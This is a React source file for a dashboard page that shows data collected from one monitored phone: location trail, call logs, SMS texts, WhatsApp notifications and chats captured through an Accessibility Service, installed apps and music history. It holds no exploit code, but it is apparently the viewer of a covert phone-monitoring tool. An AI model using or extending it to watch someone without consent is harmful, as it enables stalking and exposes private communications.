import { useEffect, useMemo, useRef, useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
import L from 'leaflet'
import {
  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps, getMusicHistory,
  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto, MusicPlayDto
} from '../api/api'

type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps' | 'media'

const iconSelected = L.divIcon({
  className: '',
  html: '<div style="width:16px;height:16px;background:#ef4444;border:3px solid #fff;border-radius:50%;box-shadow:0 0 6px rgba(0,0,0,.5)"></div>',
  iconSize: [16, 16], iconAnchor: [8, 8],
})
const iconLatest = L.divIcon({
  className: '',
  html: '<div style="width:14px;height:14px;background:#4f46e5;border:3px solid #fff;border-radius:50%;box-shadow:0 0 6px rgba(0,0,0,.4)"></div>',
  iconSize: [14, 14], iconAnchor: [7, 7],
})

function FlyToLocation({ target }: { target: [number, number] | null }) {
  const map = useMap()
  const prev = useRef<string>('')
  useEffect(() => {
    if (!target) return
    const key = target.join(',')
    if (key === prev.current) return
    prev.current = key
    map.flyTo(target, Math.max(map.getZoom(), 15), { duration: 0.8 })
  }, [target, map])
  return null
}

const callType = (t: number) => t === 1 ? '\u{1F4F2} Incoming' : t === 2 ? '\u{1F4E4} Outgoing' : '\u274C Missed'
const smsType  = (t: number) => t === 1 ? '\u{1F4E9} Inbox' : '\u{1F4E4} Sent'
const fmt      = (ms: number) => new Date(ms).toLocaleString()
const locKey   = (lat: number, lng: number) => `${lat.toFixed(2)},${lng.toFixed(2)}`

function durationStr(ms: number): string {
  const totalSec = Math.floor(ms / 1000)
  if (totalSec < 60) return '< 1 min'
  const mins = Math.floor(totalSec / 60)
  if (mins < 60) return `${mins} min`
  const h = Math.floor(mins / 60)
  const m = mins % 60
  return m === 0 ? `${h}h` : `${h}h ${m}m`
}

const TH = ({ children }: { children: React.ReactNode }) => (
  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-500 uppercase tracking-wide bg-gray-50 border-b border-gray-200">
    {children}
  </th>
)
const TD = ({ children, className = '' }: { children: React.ReactNode; className?: string }) => (
  <td className={`px-4 py-3 text-sm text-gray-700 border-b border-gray-100 align-top ${className}`}>
    {children}
  </td>
)

const TABS: { key: Tab; label: string }[] = [
  { key: 'map',       label: '\u{1F5FA} Location' },
  { key: 'calls',     label: '\u{1F4DE} Calls' },
  { key: 'sms',       label: '\u{1F4AC} SMS' },
  { key: 'wa_notifs', label: '\u{1F514} Notifications' },
  { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
  { key: 'apps',      label: '\u{1F4E6} Apps' },
  { key: 'media',     label: '\u{1F3B5} Medias' },
]

export default function DevicePage() {
  const { id }   = useParams<{ id: string }>()
  const nav      = useNavigate()
  const deviceId = Number(id)

  const [tab,         setTab]         = useState<Tab>('map')
  const [selectedLoc, setSelectedLoc] = useState<LocationDto | null>(null)
  const [locations,   setLocations]   = useState<LocationDto[]>([])
  const [calls,       setCalls]       = useState<CallLogDto[]>([])
  const [sms,         setSms]         = useState<SmsDto[]>([])
  const [whatsapp,    setWhatsapp]    = useState<WhatsAppDto[]>([])
  const [waChats,     setWaChats]     = useState<WhatsAppChatDto[]>([])
  const [apps,        setApps]        = useState<InstalledAppDto[]>([])
  const [music,       setMusic]       = useState<MusicPlayDto[]>([])
  const [appSearch,   setAppSearch]   = useState('')
  const [activeChat,  setActiveChat]  = useState<string | null>(null)
  const msgEndRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    getLocations(deviceId).then(r => setLocations(r.data)).catch(() => {})
    getCallLogs(deviceId).then(r => setCalls(r.data)).catch(() => {})
    getSmsLogs(deviceId).then(r => setSms(r.data)).catch(() => {})
    getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
    getWhatsAppChats(deviceId).then(r => setWaChats(r.data)).catch(() => {})
    getInstalledApps(deviceId).then(r => setApps(r.data)).catch(() => {})
    getMusicHistory(deviceId).then(r => setMusic(r.data)).catch(() => {})
  }, [deviceId])

  // Auto-scroll to bottom when active chat messages change
  useEffect(() => {
    msgEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [activeChat, waChats])

  // Build unique chat list sorted by most recent message
  const chatList = Object.values(
    waChats.reduce<Record<string, { chat: string; lastMsg: string; lastTime: number; unread: number }>>((acc, m) => {
      if (!acc[m.chat]) {
        acc[m.chat] = { chat: m.chat, lastMsg: m.message, lastTime: m.timestamp, unread: 0 }
      } else if (m.timestamp > acc[m.chat].lastTime) {
        acc[m.chat].lastMsg  = m.message
        acc[m.chat].lastTime = m.timestamp
      }
      return acc
    }, {})
  ).sort((a, b) => b.lastTime - a.lastTime)

  const activeMsgs = waChats
    .filter(m => m.chat === activeChat)
    .sort((a, b) => a.timestamp - b.timestamp)

  const latest = locations[0]
  const path: [number, number][] = locations.map(l => [l.latitude, l.longitude])

  // Deduplicate consecutive locations with same lat/lng (2 decimal places)
  const dedupedLocations = useMemo(() => {
    if (locations.length === 0) return []
    const chronological = [...locations].reverse()
    const groups: Array<{ loc: LocationDto; since: number; until: number }> = []
    for (const l of chronological) {
      const key = locKey(l.latitude, l.longitude)
      const last = groups[groups.length - 1]
      if (groups.length === 0 || locKey(last.loc.latitude, last.loc.longitude) !== key) {
        groups.push({ loc: l, since: l.timestamp, until: l.timestamp })
      } else {
        last.until = l.timestamp
      }
    }
    return groups.reverse()
  }, [locations])

  return (
    <div className="h-screen flex flex-col bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-3 py-3 md:px-6 md:py-4 flex items-center gap-3 flex-shrink-0">
        <button
          onClick={() => nav('/')}
          className="text-indigo-600 hover:text-indigo-800 font-semibold text-sm transition-colors"
        >
          &larr; Devices
        </button>
        <h1 className="text-lg font-bold text-gray-900">Device #{deviceId}</h1>
      </header>

      <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' || tab === 'map' ? 'p-2 md:p-4' : 'p-3 md:p-6 overflow-y-auto'}`}>
        {/* Tabs */}
        <div className="flex flex-wrap gap-1.5 md:gap-2 mb-3 md:mb-5 flex-shrink-0">
          {TABS.map(t => (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              className={`px-3 py-1.5 md:px-4 md:py-2 rounded-lg text-xs md:text-sm font-semibold border transition-colors ${
                tab === t.key
                  ? 'bg-indigo-600 text-white border-indigo-600'
                  : 'bg-white text-gray-600 border-gray-200 hover:border-indigo-300 hover:text-indigo-600'
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>

        {/* â”€â”€â”€ MAP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'map' && (
          <div className="flex-1 flex flex-col md:flex-row gap-3 md:gap-4 min-h-0">
            {/* Harita – mobilde ~50vh, desktop %70 */}
            <div className="md:flex-[7] rounded-xl overflow-hidden shadow-sm flex-shrink-0 h-[50vh] md:h-auto">
              <MapContainer
                center={latest ? [latest.latitude, latest.longitude] : [39.9, 32.8]}
                zoom={latest ? 14 : 6}
                style={{ height: '100%' }}
              >
                <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                <FlyToLocation target={selectedLoc ? [selectedLoc.latitude, selectedLoc.longitude] : null} />
                {path.length > 1 && <Polyline positions={path} color="#4f46e5" weight={3} opacity={0.5} />}
                {locations.map((l, i) => {
                  const isSel = selectedLoc?.timestamp === l.timestamp
                  const isLatest = i === 0 && !isSel
                  if (!isSel && !isLatest) return null
                  return (
                    <Marker key={l.timestamp} position={[l.latitude, l.longitude]} icon={isSel ? iconSelected : iconLatest}>
                      <Popup>
                        {isSel ? '\u{1F4CD} Selected' : '\u{1F535} Latest'}<br />
                        {fmt(l.timestamp)}<br />
                        {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}<br />
                        Accuracy: {l.accuracy.toFixed(0)} m
                      </Popup>
                    </Marker>
                  )
                })}
              </MapContainer>
            </div>

            {/* Liste – mobilde alt, desktop %30 */}
            <div className="md:flex-[3] flex flex-col min-h-0 flex-1">
              <h3 className="text-sm font-bold text-gray-700 mb-2 flex-shrink-0">
                &#x1F4CD; Location History ({dedupedLocations.length})
              </h3>
              <div className="bg-white rounded-xl shadow-sm overflow-y-auto flex-1">
                <table className="w-full border-collapse text-xs">
                  <thead className="sticky top-0 z-10">
                    <tr><TH>#</TH><TH>Date & Time</TH><TH>Accuracy</TH><TH>Duration</TH></tr>
                  </thead>
                  <tbody>
                    {dedupedLocations.map(({ loc: l, since, until }, i) => {
                      const isSel = selectedLoc?.timestamp === l.timestamp
                      const duration = until - since
                      return (
                        <tr
                          key={i}
                          onClick={() => setSelectedLoc(isSel ? null : l)}
                          className={`cursor-pointer transition-colors ${
                            isSel ? 'bg-red-50' : i === 0 ? 'bg-indigo-50' : 'hover:bg-gray-50'
                          }`}
                        >
                          <TD>{isSel ? '\u{1F4CD}' : i === 0 ? '\u{1F535}' : i + 1}</TD>
                          <TD>{fmt(l.timestamp)}</TD>
                          <TD>{l.accuracy.toFixed(0)} m</TD>
                          <TD>{duration > 0 ? durationStr(duration) : '—'}</TD>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* â”€â”€â”€ CALLS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'calls' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">

            {/* Mobile */}
            <div className="md:hidden divide-y divide-gray-100">
              {calls.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</p>}
              {calls.map((c, i) => (
                <div key={i} className="flex items-center gap-3 px-4 py-3">
                  <span className="text-2xl flex-shrink-0">
                    {c.type === 1 ? '📲' : c.type === 2 ? '📤' : '❌'}
                  </span>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-gray-800 truncate">{c.name || c.number}</p>
                    {c.name && <p className="text-xs text-gray-400">{c.number}</p>}
                    <p className="text-xs text-gray-400">{callType(c.type)} · {c.duration}s · {fmt(c.date)}</p>
                  </div>
                </div>
              ))}
            </div>

            {/* Desktop */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full border-collapse">
                <thead><tr><TH>Contact</TH><TH>Number</TH><TH>Type</TH><TH>Duration</TH><TH>Date</TH></tr></thead>
                <tbody>
                  {calls.map((c, i) => (
                    <tr key={i} className="hover:bg-gray-50">
                      <TD>{c.name || '—'}</TD>
                      <TD>{c.number}</TD>
                      <TD>{callType(c.type)}</TD>
                      <TD>{c.duration}s</TD>
                      <TD>{fmt(c.date)}</TD>
                    </tr>
                  ))}
                  {calls.length === 0 && <tr><td colSpan={5} className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</td></tr>}
                </tbody>
              </table>
            </div>

          </div>
        )}

        {/* â”€â”€â”€ SMS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'sms' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">

            {/* Mobile */}
            <div className="md:hidden divide-y divide-gray-100">
              {sms.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</p>}
              {sms.map((m, i) => (
                <div key={i} className="flex items-start gap-3 px-4 py-3">
                  <span className="text-2xl flex-shrink-0 mt-0.5">{m.type === 1 ? '📩' : '📤'}</span>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2">
                      <p className="text-sm font-semibold text-gray-800 truncate">{m.address}</p>
                      <p className="text-xs text-gray-400 flex-shrink-0">{fmt(m.date)}</p>
                    </div>
                    <p className="text-sm text-gray-600 mt-0.5 break-words">{m.body}</p>
                  </div>
                </div>
              ))}
            </div>

            {/* Desktop */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full border-collapse">
                <thead><tr><TH>From/To</TH><TH>Message</TH><TH>Type</TH><TH>Date</TH></tr></thead>
                <tbody>
                  {sms.map((m, i) => (
                    <tr key={i} className="hover:bg-gray-50">
                      <TD>{m.address}</TD>
                      <TD>{m.body}</TD>
                      <TD>{smsType(m.type)}</TD>
                      <TD>{fmt(m.date)}</TD>
                    </tr>
                  ))}
                  {sms.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</td></tr>}
                </tbody>
              </table>
            </div>

          </div>
        )}

        {/* â”€â”€â”€ WA NOTIFS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'wa_notifs' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">

            {/* Mobile */}
            <div className="md:hidden divide-y divide-gray-100">
              {whatsapp.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</p>}
              {whatsapp.map((w, i) => (
                <div key={i} className="flex items-start gap-3 px-4 py-3">
                  {w.appIcon
                    ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-9 h-9 rounded flex-shrink-0 mt-0.5" />
                    : <span className="text-2xl flex-shrink-0 mt-0.5">📦</span>
                  }
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2">
                      <p className="text-xs font-semibold text-indigo-600 truncate">{w.appName || w.appPackage} · {w.sender}</p>
                      <p className="text-xs text-gray-400 flex-shrink-0">{fmt(w.timestamp)}</p>
                    </div>
                    <p className="text-sm text-gray-700 mt-0.5 break-words">{w.message}</p>
                  </div>
                </div>
              ))}
            </div>

            {/* Desktop */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full border-collapse">
                <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
                <tbody>
                  {whatsapp.map((w, i) => (
                    <tr key={i} className="hover:bg-gray-50">
                      <TD>
                        <div className="flex items-center gap-2">
                          {w.appIcon
                            ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-6 h-6 rounded" />
                            : <span className="text-lg">{'\u{1F4E6}'}</span>
                          }
                          <span className="font-medium text-gray-800">{w.appName || w.appPackage}</span>
                        </div>
                      </TD>
                      <TD className="font-medium">{w.sender}</TD>
                      <TD>{w.message}</TD>
                      <TD>{fmt(w.timestamp)}</TD>
                    </tr>
                  ))}
                  {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
                </tbody>
              </table>
            </div>

          </div>
        )}

        {/* â”€â”€â”€ WA CHATS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {/* WA CHATS */}
        {tab === 'wa_chats' && (
          waChats.length === 0 ? (
            <div className="bg-white rounded-xl shadow-sm flex items-center justify-center flex-1 text-gray-400 text-sm text-center px-4">
              No chat messages yet. Enable Accessibility Service and open a WhatsApp chat.
            </div>
          ) : (
            <div className="bg-white rounded-xl shadow-sm overflow-hidden flex flex-col md:flex-row flex-1 min-h-0">
              {/* Contacts: mobilde %40 yükseklik, desktopda 288px genişlik */}
              <div className="flex-[2] md:flex-none md:w-72 border-b md:border-b-0 md:border-r border-gray-100 flex flex-col min-h-0">
                <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200 flex-shrink-0">
                  <p className="text-sm font-semibold text-gray-700">Conversations</p>
                  <p className="text-xs text-gray-400">{chatList.length} chat{chatList.length !== 1 ? 's' : ''}</p>
                </div>
                <div className="overflow-y-auto flex-1">
                  {chatList.map(c => (
                    <button
                      key={c.chat}
                      onClick={() => setActiveChat(c.chat)}
                      className={`w-full text-left flex items-center gap-3 px-4 py-3 border-b border-gray-50 transition-colors ${
                        activeChat === c.chat ? 'bg-[#f0f2f5]' : 'hover:bg-gray-50'
                      }`}
                    >
                      <div className="w-10 h-10 rounded-full bg-emerald-500 flex-shrink-0 flex items-center justify-center text-white font-bold text-sm">
                        {c.chat.charAt(0).toUpperCase()}
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-semibold text-gray-800 truncate">{c.chat}</span>
                          <span className="text-xs text-gray-400 flex-shrink-0 ml-1">
                            {new Date(c.lastTime).toLocaleDateString([], { day: '2-digit', month: '2-digit' })}
                          </span>
                        </div>
                        <p className="text-xs text-gray-500 truncate mt-0.5">{c.lastMsg}</p>
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Chat paneli: mobilde %60 yükseklik, desktopda kalan alan */}
              {activeChat === null ? (
                <div className="flex-[3] md:flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#f0f2f5] min-h-0">
                  <div className="text-5xl mb-3">&#x1F4AC;</div>
                  <p className="text-sm font-medium">Select a conversation</p>
                </div>
              ) : (
                <div className="flex-[3] md:flex-1 flex flex-col min-h-0 min-w-0">
                  {/* Chat header */}
                  <div className="px-3 py-3 md:px-4 bg-[#f0f2f5] border-b border-gray-200 flex items-center gap-3 flex-shrink-0">
                    <div className="w-9 h-9 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
                      {activeChat.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-gray-800">{activeChat}</p>
                      <p className="text-xs text-gray-500">{activeMsgs.length} messages</p>
                    </div>
                  </div>

                  {/* Messages */}
                  <div
                    className="flex-1 overflow-y-auto px-3 md:px-4 py-4 space-y-1 min-h-0"
                    style={{ backgroundColor: '#efeae2' }}
                  >
                    {activeMsgs.map((m, i) => {
                      const isMe = m.sender === '__me__'
                      const showSender = !isMe && (i === 0 || activeMsgs[i - 1].sender !== m.sender)
                      return (
                        <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                          <div
                            className={`max-w-[75vw] md:max-w-xs lg:max-w-md xl:max-w-lg px-3 py-2 rounded-lg shadow-sm text-sm relative ${
                              isMe
                                ? 'bg-[#d9fdd3] text-gray-800 rounded-br-none'
                                : 'bg-white text-gray-800 rounded-bl-none'
                            }`}
                          >
                            {showSender && (
                              <p className="text-xs font-semibold text-emerald-600 mb-1">{m.sender}</p>
                            )}
                            <p className="leading-snug break-words">{m.message}</p>
                            <p className="text-right text-[10px] text-gray-400 mt-1 -mb-0.5">
                              {new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </p>
                          </div>
                        </div>
                      )
                    })}
                    <div ref={msgEndRef} />
                  </div>
                </div>
              )}
            </div>
          )
        )}

        {/* ─── APPS ───────────────────────────────────────────── */}
        {tab === 'apps' && (
          <div className="flex flex-col gap-3">
            <div className="flex-shrink-0 flex items-center gap-3 flex-wrap">
              <input
                type="search"
                placeholder="Search apps…"
                value={appSearch}
                onChange={e => setAppSearch(e.target.value)}
                className="w-full md:w-72 px-3 py-2 text-sm border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-300"
              />
              <span className="text-xs text-gray-400">
                {apps.filter(a =>
                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
                ).length} / {apps.length} apps
              </span>
            </div>

            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
              {(() => {
                const filtered = apps.filter(a =>
                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
                )
                return (
                  <>
                    {/* Mobile */}
                    <div className="md:hidden divide-y divide-gray-100">
                      {filtered.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</p>}
                      {filtered.map((a, i) => (
                        <div key={i} className="flex items-center gap-3 px-4 py-3">
                          {a.iconBase64
                            ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-10 h-10 rounded-xl flex-shrink-0" />
                            : <span className="w-10 h-10 flex items-center justify-center text-2xl flex-shrink-0">📦</span>
                          }
                          <div className="flex-1 min-w-0">
                            <p className="text-sm font-semibold text-gray-800 truncate">{a.appName}</p>
                            <p className="text-xs text-gray-400 font-mono truncate">{a.packageName}</p>
                            <p className="text-xs text-gray-400">v{a.version || '—'} · {fmt(a.lastSeenAt)}</p>
                          </div>
                        </div>
                      ))}
                    </div>

                    {/* Desktop */}
                    <div className="hidden md:block overflow-x-auto">
                      <table className="w-full border-collapse">
                        <thead>
                          <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
                        </thead>
                        <tbody>
                          {filtered.map((a, i) => (
                            <tr key={i} className="hover:bg-gray-50">
                              <TD>
                                {a.iconBase64
                                  ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
                                  : <span className="text-gray-300 text-lg">📦</span>}
                              </TD>
                              <TD className="font-medium">{a.appName}</TD>
                              <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
                              <TD>{a.version || '—'}</TD>
                              <TD>{fmt(a.installedAt)}</TD>
                              <TD>{fmt(a.lastSeenAt)}</TD>
                            </tr>
                          ))}
                          {filtered.length === 0 && (
                            <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
                          )}
                        </tbody>
                      </table>
                    </div>
                  </>
                )
              })()}
            </div>
          </div>
        )}

        {/* ─── MUSIC ──────────────────────────────────────────── */}
        {tab === 'media' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">

            {/* ── Mobile: card list ─────────────────────────────── */}
            <div className="md:hidden divide-y divide-gray-100">
              {music.length === 0 && (
                <p className="px-4 py-8 text-center text-gray-400 text-sm">
                  No music data yet. Requires Notification Listener permission on device.
                </p>
              )}
              {music.map((m, i) => {
                const appLabel =
                  m.appPackage === 'com.spotify.music'                         ? '🟢 Spotify' :
                  m.appPackage === 'com.google.android.apps.youtube.music'     ? '🔴 YT Music' :
                  m.appPackage === 'com.apple.android.music'                   ? '🍎 Apple Music' :
                  m.appPackage
                const dur = m.durationMs
                  ? `${Math.round(m.durationMs / 1000 / 60)}:${String(Math.round((m.durationMs / 1000) % 60)).padStart(2, '0')}`
                  : null
                return (
                  <div key={i} className="flex items-center gap-3 px-4 py-3">
                    {m.albumArt
                      ? <img src={`data:image/jpeg;base64,${m.albumArt}`} className="w-9 h-9 rounded-lg object-cover flex-shrink-0" alt="art" />
                      : <div className="w-9 h-9 rounded-lg bg-indigo-50 flex items-center justify-center text-lg flex-shrink-0">🎵</div>
                    }
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-semibold text-gray-800 truncate">{m.trackTitle}</p>
                      <p className="text-xs text-gray-500 truncate">{m.artistName || '—'}{m.albumName ? ` · ${m.albumName}` : ''}</p>
                      <div className="flex items-center gap-2 mt-0.5 flex-wrap">
                        <span className="text-xs text-gray-400">{appLabel}</span>
                        {dur && <span className="text-xs text-gray-400">· {dur}</span>}
                        <span className="text-xs text-gray-400">· {fmt(m.timestamp)}</span>
                      </div>
                    </div>
                  </div>
                )
              })}
            </div>

            {/* ── Desktop: table ────────────────────────────────── */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full border-collapse">
                <thead>
                  <tr><TH>{''}</TH><TH>🎵 Track</TH><TH>Artist</TH><TH>Album</TH><TH>App</TH><TH>Duration</TH><TH>Played at</TH></tr>
                </thead>
                <tbody>
                  {music.map((m, i) => (
                    <tr key={i} className="hover:bg-gray-50">
                      <TD className="w-10 pr-0">
                        {m.albumArt
                          ? <img src={`data:image/jpeg;base64,${m.albumArt}`} className="w-9 h-9 rounded-lg object-cover" alt="art" />
                          : <div className="w-9 h-9 rounded-lg bg-indigo-50 flex items-center justify-center text-sm">🎵</div>
                        }
                      </TD>
                      <TD className="font-medium">{m.trackTitle}</TD>
                      <TD>{m.artistName || '—'}</TD>
                      <TD className="text-gray-500">{m.albumName || '—'}</TD>
                      <TD className="font-mono text-xs text-gray-400">{
                        m.appPackage === 'com.spotify.music'                         ? '🟢 Spotify' :
                        m.appPackage === 'com.google.android.apps.youtube.music'     ? '🔴 YT Music' :
                        m.appPackage === 'com.apple.android.music'                   ? '🍎 Apple Music' :
                        m.appPackage
                      }</TD>
                      <TD>{m.durationMs ? `${Math.round(m.durationMs / 1000 / 60)}:${String(Math.round((m.durationMs / 1000) % 60)).padStart(2, '0')}` : '—'}</TD>
                      <TD>{fmt(m.timestamp)}</TD>
                    </tr>
                  ))}
                  {music.length === 0 && (
                    <tr><td colSpan={7} className="px-4 py-8 text-center text-gray-400 text-sm">No music data yet. Requires Notification Listener permission on device.</td></tr>
                  )}
                </tbody>
              </table>
            </div>

          </div>
        )}
      </main>
    </div>
  )
}
